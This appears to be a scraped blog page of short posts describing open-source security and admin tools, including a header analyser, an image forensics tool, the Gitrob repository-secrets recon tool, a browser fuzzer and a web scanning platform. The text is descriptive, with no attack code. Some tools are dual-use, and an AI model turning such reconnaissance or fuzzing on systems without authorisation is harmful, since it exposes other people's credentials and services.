      <div style="text-align: justify;">
        gethead.py is a Python HTTP Header Analysis Vulnerability Tool. It identifies security vulnerabilities and the lack of protection in HTTP Headers.
      </div> 
      <a name="more"></a>
      <br> 
      <b><span style="font-size: large;">Usage:</span></b>
      <br> 
      <pre><code>$ python gethead.py http://domain.com
</code></pre> 
      <br> 
      <span style="font-size: large;"><b>Changelog</b></span>
      <br> Version 0.1 - Initial Release
      <br> 
      <ul> 
       <li>Written in Python 2.7.5</li> 
       <li>Performs HTTP Header Analysis</li> 
       <li>Reports Header Vulnerabilities</li> 
      </ul> 
      <br> 
      <b><span style="font-size: large;">Features in Development</span></b>
      <br> 
      <b>Version 0.2 - Next Release (April 2014 Release)</b>
      <br> 
      <ul> 
       <li>Support for git updates</li> 
       <li>Support for Python 3.3</li> 
       <li>Complete Header Analysis</li> 
       <li>Additional Logic for Severity Classifications</li> 
       <li>Rank Vulnerabilities by Severity</li> 
       <li>Export Findings with Description, Impact, Execution, Fix, and References</li> 
       <li>Export with multi-format options (XML, HTML, TXT)</li> 
      </ul> 
      <br> 
      <b> Version 0.3 - Future Release (May 2014 Release)</b>
      <br> 
      <ul> 
       <li>Replay and Inline Upstream Proxy support to import into other tools</li> 
       <li>Scan domains, sub-domains, and multi-services</li> 
       <li>Header Injection and Fuzzing functionality</li> 
       <li>HTTP Header Policy Bypassing</li> 
       <li>Modularize and port to more platforms<br>(e.g. <a href="https://github.com/DennisAntunes/gMinorWeb">gMinor</a>, Kali, Burp Extension, Metasploit, Chrome, Firefox)</li> 
      </ul> 
      <div> 
       <br>
      </div> 
      <div> 
       <div style="text-align: center;"> 
        <b><span style="font-size: x-large;"><a href="https://github.com/httphacker/gethead" target="_blank">Download&nbsp;GetHead</a></span></b>
       </div> 
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="1977347421928211252" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Ghiro 0.2 - Automated Digital Image Forensics Tool  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-1977347421928211252" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://2.bp.blogspot.com/-HIcqOuPv050/VMZMN3aKHPI/AAAAAAAADmY/WB0HLqK0GE0/s1600/ghiro.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-HIcqOuPv050/VMZMN3aKHPI/AAAAAAAADmY/WB0HLqK0GE0/s1600/ghiro.png" height="316" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        Sometime forensic investigators need to process digital images as evidence. There are some tools around, otherwise it is difficult to deal with forensic analysis with lot of images involved. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Images contain tons of information, Ghiro extracts these information from provided images and display them in a nicely formatted report. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Dealing with tons of images is pretty easy, Ghiro is designed to scale to support gigs of images. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        All tasks are totally automated, you have just to upload you images and let Ghiro does the work. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Understandable reports, and great search capabilities allows you to find a needle in a haystack. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Ghiro is a multi user environment, different permissions can be assigned to each user. Cases allow you to group image analysis by topic, you can choose which user allow to see your case with a permission schema.
       <br> 
       <a name="more"></a>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span class="Apple-style-span" style="font-size: large;">Use Cases </span></b>
      </div> 
      <div class=""> 
       <div style="text-align: justify;"> 
        <br>
       </div> 
       <div style="text-align: justify;">
         Ghiro can be used in many scenarios, forensic investigators could use it on daily basis in their analysis lab but also people interested to undercover secrets hidden in images could benefit. Some use case examples are the following: 
       </div> 
      </div> 
      <ul> 
       <li style="text-align: justify;"> If you need to extract all data and metadata hidden in an image in a fully automated way </li> 
       <li style="text-align: justify;"> If you need to analyze a lot of images and you have not much time to read the report for all them </li> 
       <li style="text-align: justify;"> If you need to search a bunch of images for some metadata </li> 
       <li style="text-align: justify;"> If you need to geolocate a bunch of images and see them in a map </li> 
       <li style="text-align: justify;"> If you have an hash list of "special" images and you want to search for them </li> 
      </ul> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Anyway Ghiro is designed to be used in many other scenarios, the imagination is the only limit.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span class="Apple-style-span" style="font-size: large;">Video</span></b>
      </div> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <iframe allowfullscreen frameborder="0" height="360" src="//www.youtube.com/embed/9B_0GBWCPbE" width="640"></iframe> 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <span class="white" style="font-size: large;"><b>MAIN <span class="main-color">FEATURES</span></b></span> 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b>Metadata extraction</b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Metadata are divided in several categories depending on the standard they come from. Image metadata are extracted and categorized. For example: EXIF, IPTC, XMP. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b>GPS Localization </b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Embedded in the image metadata sometimes there is a geotag, a bit of GPS data providing the longitude and latitude of where the photo was taken, it is read and the position is displayed on a map. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b>MIME information </b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        The image MIME type is detected to know the image type your are dealing with, in both contacted (example: image/jpeg) and extended form. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b>Error Level Analysis </b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Error Level Analysis (ELA) identifies areas within an image that are at different compression levels. The entire picture should be at roughly the same level, if a difference is detected, then it likely indicates a digital modification.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b>Thumbnail extraction </b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        The thumbnails and data related to them are extracted from image metadata and stored for review. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b>Thumbnail consistency </b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Sometimes when a photo is edited, the original image is edited but the thumbnail not. Difference between the thumbnails and the images are detected.&nbsp;
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b>Signature engine&nbsp;</b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Over 120 signatures provide evidence about most critical data to highlight focal points and common exposures. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b>Hash matching </b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Suppose you are searching for an image and you have only the hash. You can provide a list of hashes and all images matching are reported. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <div style="text-align: center;"> 
        <b><span class="Apple-style-span" style="font-size: x-large;"><a href="https://github.com/ghirensics/ghiro" target="_blank">Download&nbsp;Ghiro</a></span></b>
       </div> 
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="6092091611469295391" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Gitrob - Reconnaissance tool for GitHub organizations  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-6092091611469295391" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://1.bp.blogspot.com/-PWYWS4jXISY/VL_Ta1Ud62I/AAAAAAAADlM/J0eg-OvcOvM/s1600/gitrob.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-PWYWS4jXISY/VL_Ta1Ud62I/AAAAAAAADlM/J0eg-OvcOvM/s1600/gitrob.png" height="370" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        Gitrob is a command line tool that can help organizations and security professionals find such sensitive information. The tool will iterate over all public organization and member repositories and match filenames against a range of patterns for files, that typically contain sensitive or dangerous information.
      </div> 
      <a name="more"></a>
      <br> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;">How it works</span></b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Looking for sensitive information in GitHub repositories is not a new thing, it has been known for a while that things such as private keys and credentials can be found with GitHub's search functionality, however Gitrob makes it easier to focus the effort on a specific organization.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        The first thing the tool does is to collect all public repositories of the organization itself. It then goes on to collect all the organization members and their public repositories, in order to compile a list of repositories that might be related or have relevance to the organization.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        When the list of repositories has been compiled, it proceeds to gather all the filenames in each repository and runs them through a series of observers that will flag the files, if they match any patterns of known sensitive files. This step might take a while if the organization is big or if the members have a lot of public repositories.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        All of the members, repositories and files will be saved to a PostgreSQL database. When everything has been sifted through, it will start a Sinatra web server locally on the machine, which will serve a simple web application to present the collected data for analysis.
      </div> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/michenriksen/gitrob" target="_blank">Download&nbsp;Gitrob</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="1185156291728700412" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> GoAccess - Real-time Web Log Analyzer and Interactive Viewer  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-1185156291728700412" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://2.bp.blogspot.com/-rbD2IQSdfCc/VUAvMeYbo-I/AAAAAAAAD8Y/_Pcr6EJXpls/s1600/goaccess-dashboard.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-rbD2IQSdfCc/VUAvMeYbo-I/AAAAAAAAD8Y/_Pcr6EJXpls/s1600/goaccess-dashboard.png" height="352" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        GoAccess is an open source 
       <strong>real-time web log analyzer</strong> and interactive viewer that 
       <strong>runs in a terminal in *nix systems.</strong> It provides fast and valuable HTTP statistics for system administrators that require a visual server report on the fly.
      </div> 
      <a name="more"></a>
      <br> 
      <div class="span4 content"> 
       <div style="text-align: justify;"> 
        <b><span style="font-size: large;">Features&nbsp;</span></b>
       </div> 
       <div style="text-align: justify;"> 
        <br>
       </div> 
       <div style="text-align: justify;">
         GoAccess parses the specified web log file and outputs the data to the X terminal.
       </div> 
       <ul> 
        <li style="text-align: justify;">General statistics, bandwidth, etc.</li> 
        <li style="text-align: justify;">Time taken to serve the request <em>(useful to track pages that are slowing down your site)</em></li> 
        <li style="text-align: justify;">Top visitors</li> 
        <li style="text-align: justify;">Requested files &amp; static files</li> 
        <li style="text-align: justify;">404 or Not Found</li> 
        <li style="text-align: justify;">Hosts, Reverse DNS, IP Location</li> 
        <li style="text-align: justify;">Operating Systems</li> 
        <li style="text-align: justify;">Browsers and Spiders</li> 
        <li style="text-align: justify;">Referring Sites &amp; URLs</li> 
        <li style="text-align: justify;">Keyphrases</li> 
        <li style="text-align: justify;">Geo Location - Continent/Country/City</li> 
        <li style="text-align: justify;">Visitors Time Distribution <span class="label label-info">New</span></li> 
        <li style="text-align: justify;">HTTP Status Codes</li> 
        <li style="text-align: justify;">Ability to output JSON and CSV</li> 
        <li style="text-align: justify;">Different Color Schemes</li> 
        <li style="text-align: justify;">Support for large datasets + data persistence</li> 
        <li style="text-align: justify;">Support for IPv6</li> 
        <li style="text-align: justify;"> Output statistics to HTML. See <a class="link" href="http://goaccess.io/goaccess_html_report.html?1410179475" title="HTML Report
                  Demo"><strong>report</strong> <i class="fa fa-external-link"></i></a> </li> 
        <li style="text-align: justify;">and more...</li> 
       </ul> 
       <div style="text-align: justify;">
         GoAccess allows 
        <strong>any custom log format string</strong>. Predefined options include, but not limited to:
       </div> 
       <ul> 
        <li style="text-align: justify;">Amazon CloudFront (Download Distribution).</li> 
        <li style="text-align: justify;">Apache/Nginx Common/Combined + VHosts</li> 
        <li style="text-align: justify;">W3C format (IIS)</li> 
       </ul> 
       <div> 
        <div style="text-align: justify;"> 
         <br>
        </div> 
       </div> 
       <div> 
        <div style="text-align: justify;"> 
         <b><span style="font-size: large;">Why GoAccess?</span></b>
        </div> 
        <div style="text-align: justify;"> 
         <br>
        </div> 
        <div style="text-align: justify;">
          The main idea behind GoAccess is being able to quickly analyze and view web server statistics in 
         <strong>real time</strong> without having to generate an HTML report. Although it is possible to generate an 
         <code>HTML</code>, 
         <code>JSON</code>, 
         <code>CSV</code> report, by default it outputs to a terminal.
        </div> 
        <div style="text-align: justify;">
          You can see it more as a monitor command tool than anything else.
        </div> 
        <br> 
        <br> 
        <div style="text-align: center;"> 
         <b><span style="font-size: x-large;"><a href="http://goaccess.io/download" target="_blank">Download GoAccess</a></span></b>
        </div> 
       </div> 
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="6195175392369838947" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Gping - Ping, But With A Graph  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-6195175392369838947" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://2.bp.blogspot.com/-CD4ZU0yZIoY/VihF49UCE4I/AAAAAAAAEu0/xM9brLg5CF4/s1600/gping.gif" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="319" src="http://2.bp.blogspot.com/-CD4ZU0yZIoY/VihF49UCE4I/AAAAAAAAEu0/xM9brLg5CF4/s640/gping.gif" width="640"></a>
      </div> 
      <br> Ping, but with a graph 
      <br> 
      <br> 
      <span style="font-size: large;"> <b> Install and run </b> </span> 
      <br> Created/tested with Python 3.4, should run on 2.7 (will require the 
      <code> statistics </code> module though). 
      <br> 
      <pre><code>pip3 install pinggraph</code></pre> 
      <br> Tested on Windows and Ubuntu, should run on OS X as well. After installation just run: 
      <br> 
      <pre><code>gping [yourhost]</code></pre> 
      <br> If you don't give a host then it pings google.
      <br> 
      <a name="more"></a>
      <br> 
      <span style="font-size: large;"> <b> Why? </b> </span> 
      <br> My apartments internet is all 4g, and while it's normally pretty fast it can be a bit flakey. I often found myself running 
      <code> ping -t google.com </code> in a command window to get a rough idea of the network speed, and I thought a graph would be a great way to visualize the data. I still wanted to just use the command line though, so I decided to try and write a cross platform one that I could use. And here we are. 
      <br> 
      <br> 
      <span style="font-size: large;"> <b> Code </b> </span> 
      <br> For a quick hack the code started off really nice, but after I decided pretty colors were a good addition it quickly got rather complicated. Inside pinger.py is a function 
      <code> plot() </code> , this uses a canvas-like object to "draw" things like lines and boxes to the screen. I found on Windows that changing the colors is slow and caused the screen to flicker, so theres a big mess of a function called 
      <code> process_colors </code> to try and optimize that. Don't ask. 
      <br> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b> <span style="font-size: x-large;"> <a href="https://github.com/orf/gping" target="_blank"> Download Gping </a> </span> </b> 
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="6275762536098379016" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Graudit - Find potential security flaws in source code using grep  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-6275762536098379016" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://3.bp.blogspot.com/-zim-Uzqyi-U/VUawCllDawI/AAAAAAAAD9Q/u_qppytSk7I/s1600/Graudit.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-zim-Uzqyi-U/VUawCllDawI/AAAAAAAAD9Q/u_qppytSk7I/s1600/Graudit.jpg"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        Graudit is a simple script and signature sets that allows you to find potential security flaws in source code using the GNU utility grep. It's comparable to other static analysis applications like RATS, SWAAT and flaw-finder while keeping the technical requirements to a minimum and being very flexible.
      </div> 
      <a name="more"></a>
      <br> 
      <div style="text-align: justify;"> 
       <b>Who should use graudit?</b>
      </div> 
      <div style="text-align: justify;">
        System administrators, developers, auditors, vulnerability researchers and anyone else that cares to know if the application they develop, deploy or otherwise use is secure.
      </div> 
      <b></b>
      <br> 
      <div style="text-align: justify;"> 
       <b><b>What languages are supported?</b></b>
      </div> 
      <ul> 
       <li style="text-align: justify;">ASP</li> 
       <li style="text-align: justify;">JSP</li> 
       <li style="text-align: justify;">Perl</li> 
       <li style="text-align: justify;">PHP</li> 
       <li style="text-align: justify;">Python</li> 
       <li style="text-align: justify;">Other (looks for suspicious comments, etc)</li> 
      </ul> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;">USAGE</span></b>
      </div> 
      <div style="text-align: justify;">
        Graudit supports several options and tries to follow good shell practices. For a list of the options you can run graudit -h or see below. The simplest way to use graudit is;
      </div> 
      <pre style="text-align: justify;"><code>graudit /path/to/scan</code></pre> 
      <br> 
      <b><span style="font-size: large;">DEPENDENCIES</span></b>
      <br> Required: 
      <b>bash</b>, 
      <b>grep</b>, 
      <b>sed</b>
      <br> 
      <br> The following options are available: 
      <br> 
      <pre><code>  -A scan ALL files
  -c 
        <num>
          number of lines of context to display, default is 2 -d 
         <db>
           database to use -h prints a short help text -i case in-sensitive search -l lists databases available -L vim friendly lines -v prints version number -x exclude these files -z supress colors -Z high contrast colors
         </db>
        </num></code></pre> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/wireghoul/graudit/" target="_blank">Download Graudit</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="4145070691809880061" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Grinder - System to Automate the Fuzzing of Web Browsers  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-4145070691809880061" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://1.bp.blogspot.com/-ieOxRAGokfQ/VMADGruZ8uI/AAAAAAAADlc/yzG56DGTOX4/s1600/grinder.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-ieOxRAGokfQ/VMADGruZ8uI/AAAAAAAADlc/yzG56DGTOX4/s1600/grinder.png" height="386" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        Grinder is a system to automate the fuzzing of web browsers and the management of a large number of crashes. Grinder Nodes provide an automated way to fuzz a browser, and generate useful crash information (such as call stacks with symbol information as well as logging information which can be used to generate reproducible test cases at a later stage). A Grinder Server provides a central location to collate crashes and, through a web interface, allows multiple users to login and manage all the crashes being generated by all of the Grinder Nodes.
      </div> 
      <a name="more"></a>
      <br> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;">System Requirements</span></b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        A Grinder Node requires a 32/64 bit Windows system and Ruby 2.0 (Ruby 1.9 is also supported but you wont be able to fuzz 64bit targets).
      </div> 
      <div style="text-align: justify;">
        A Grinder Server requires a web server with MySQL and PHP.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;">Features</span></b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Grinder Server features:
      </div> 
      <ul class="task-list"> 
       <li style="text-align: justify;">Multi user web application. User can login and manage all crashes reported by the Grinder Nodes. Administrators can create more users and view the login history.</li> 
       <li style="text-align: justify;">Users can view the status of the Grinder system. The activity of all nodes in the system is shown including status information such as average testcases being run per minute, the total crashes a node has generated and the last time a node generated a crash.</li> 
       <li style="text-align: justify;">Users can view all of the crashes in the system and sort them by node, target, fuzzer, type, hash, time or count.</li> 
       <li style="text-align: justify;">Users can view crash statistics for the fuzzers, including total and unique crashes per fuzzer and the targets each fuzzer is generating crashes on.</li> 
       <li style="text-align: justify;">Users can hide all duplicate crashes so as to only show unique crashes in the system in order to easily manage new crashes as they occur.</li> 
       <li style="text-align: justify;">Users can assign crashes to one another as well as mark a particular crash as interesting, exploitable, uninteresting or unknown.</li> 
       <li style="text-align: justify;">Users can store written notes for a particular crash (viewable to all other users) to help manage them.</li> 
       <li style="text-align: justify;">Users can download individual crash log files to help debug and recreate testcases.</li> 
       <li style="text-align: justify;">Users can create custom filters to exclude uninteresting crashes from the list of crashes.</li> 
       <li style="text-align: justify;">Users can create custom e-mail alerts to alert them when a new crash comes into the system that matches a specific criteria.</li> 
       <li style="text-align: justify;">Users can change their password and e-mail address on the system as well as view their own login history.</li> 
      </ul> 
      <div style="text-align: justify;">
        Grinder Node features:
      </div> 
      <ul class="task-list"> 
       <li style="text-align: justify;">A node can be brought up and begin fuzzing any supported browser via a single command.</li> 
       <li style="text-align: justify;">A node injects a logging DLL into the target browser process to help the fuzzers perform logging in order to recreate testcases at a later stage.</li> 
       <li style="text-align: justify;">A node records useful crash information such as call stack, stack dump, code dump and register info and also includes any available symbol information.</li> 
       <li style="text-align: justify;">A node can automatically encrypt all crash information with an RSA public key.</li> 
       <li style="text-align: justify;">A node can automatically report new crashes to a remote Grinder Server.</li> 
       <li style="text-align: justify;">A node can run largely unattended for a long period of time.</li> 
      </ul> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;">Grinder Screenshots</span></b>
      </div> 
      <br> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://2.bp.blogspot.com/-6Vew8ruoLDI/VMAES2Mn9FI/AAAAAAAADlo/IbfbuaYi4K4/s1600/screenshot_crash.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-6Vew8ruoLDI/VMAES2Mn9FI/AAAAAAAADlo/IbfbuaYi4K4/s1600/screenshot_crash.png" height="482" width="640"></a>
      </div> 
      <br> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://1.bp.blogspot.com/-uP2mNGOhMHI/VMAETAvCC0I/AAAAAAAADls/1WkI_GCEhpw/s1600/screenshot_node.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-uP2mNGOhMHI/VMAETAvCC0I/AAAAAAAADls/1WkI_GCEhpw/s1600/screenshot_node.png" height="490" width="640"></a>
      </div> 
      <br> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://3.bp.blogspot.com/-GqBlb420GP0/VMAEThBfusI/AAAAAAAADlw/fni7g0gKmpI/s1600/screenshot_server2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-GqBlb420GP0/VMAEThBfusI/AAAAAAAADlw/fni7g0gKmpI/s1600/screenshot_server2.png" height="386" width="640"></a>
      </div> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/stephenfewer/grinder" target="_blank">Download&nbsp;Grinder</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="399698842174560554" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Gryffin - Large Scale Web Security Scanning Platform  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-399698842174560554" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://3.bp.blogspot.com/-AGfw4FW15d4/VgyGmmLCthI/AAAAAAAAErA/FVFulqXq0eg/s1600/yahoo.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="188" src="http://3.bp.blogspot.com/-AGfw4FW15d4/VgyGmmLCthI/AAAAAAAAErA/FVFulqXq0eg/s640/yahoo.jpg" width="640"></a>
      </div> 
      <div style="text-align: justify;">
        Gryffin is a large scale web security scanning platform. It is not yet another scanner. It was written to solve two specific problems with existing scanners: coverage and scale. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Better coverage translates to fewer false negatives. Inherent scalability translates to capability of scanning, and supporting a large elastic application infrastructure. Simply put, the ability to scan 1000 applications today to 100,000 applications tomorrow by straightforward horizontal scaling.
      </div> 
      <a name="more"></a>
      <br> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: x-large;"> Coverage</span></b>
      </div> 
      <div style="text-align: justify;">
        Coverage has two dimensions - one during crawl and the other during fuzzing. In crawl phase, coverage implies being able to find as much of the application footprint. In scan phase, or while fuzzing, it implies being able to test each part of the application for an applied set of vulnerabilities in a deep.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <strong> Crawl Coverage</strong>
      </div> 
      <div style="text-align: justify;">
        Today a large number of web applications are template-driven, meaning the same code or path generates millions of URLs. For a security scanner, it just needs one of the millions of URLs generated by the same code or path. Gryffin's crawler does just that. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <strong> Page Deduplication</strong>
      </div> 
      <div style="text-align: justify;">
        At the heart of Gryffin is a deduplication engine that compares a new page with already seen pages. If the HTML structure of the new page is similar to those already seen, it is classified as a duplicate and not crawled further.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <strong> DOM Rendering and Navigation</strong>
      </div> 
      <div style="text-align: justify;">
        A large number of applications today are rich applications. They are heavily driven by client-side JavaScript. In order to discover links and code paths in such applications, Gryffin's crawler uses PhantomJS for DOM rendering and navigation.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <strong> Scan Coverage</strong>
      </div> 
      <div style="text-align: justify;">
        As Gryffin is a scanning platform, not a scanner, it does not have its own fuzzer modules, even for fuzzing common web vulnerabilities like XSS and SQL Injection.
      </div> 
      <div style="text-align: justify;">
        It's not wise to reinvent the wheel where you do not have to. Gryffin at production scale at Yahoo uses open source and custom fuzzers. Some of these custom fuzzers might be open sourced in the future, and might or might not be part of the Gryffin repository.
      </div> 
      <div style="text-align: justify;">
        For demonstration purposes, Gryffin comes integrated with sqlmap and arachni. It does not endorse them or any other scanner in particular. 
      </div> 
      <div style="text-align: justify;">
        The philosophy is to improve scan coverage by being able to fuzz for just what you need.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: x-large;"> Scale</span></b>
      </div> 
      <div style="text-align: justify;">
        While Gryffin is available as a standalone package, it's primarily built for scale. 
      </div> 
      <div style="text-align: justify;">
        Gryffin is built on the publisher-subscriber model. Each component is either a publisher, or a subscriber, or both. This allows Gryffin to scale horizontally by simply adding more subscriber or publisher nodes.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: x-large;"> Operating Gryffin</span></b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;"> Pre-requisites</span></b>
      </div> 
      <ol> 
       <li style="text-align: justify;">Go </li> 
       <li style="text-align: justify;">PhantomJS, v2</li> 
       <li style="text-align: justify;">Sqlmap (for fuzzing SQLi)</li> 
       <li style="text-align: justify;">Arachni (for fuzzing XSS and web vulnerabilities)</li> 
       <li>
        <div style="text-align: justify;">
          NSQ ,
        </div> 
        <ul> 
         <li style="text-align: justify;">running lookupd at port 4160,4161</li> 
         <li style="text-align: justify;">running nsqd at port 4150,4151</li> 
         <li style="text-align: justify;">with <code>--max-msg-size=5000000</code></li> 
        </ul> </li> 
       <li>
        <div style="text-align: justify;">
          Kibana and Elastic search, for dashboarding
        </div> 
        <ul> 
         <li style="text-align: justify;">listening to JSON over port 5000</li> 
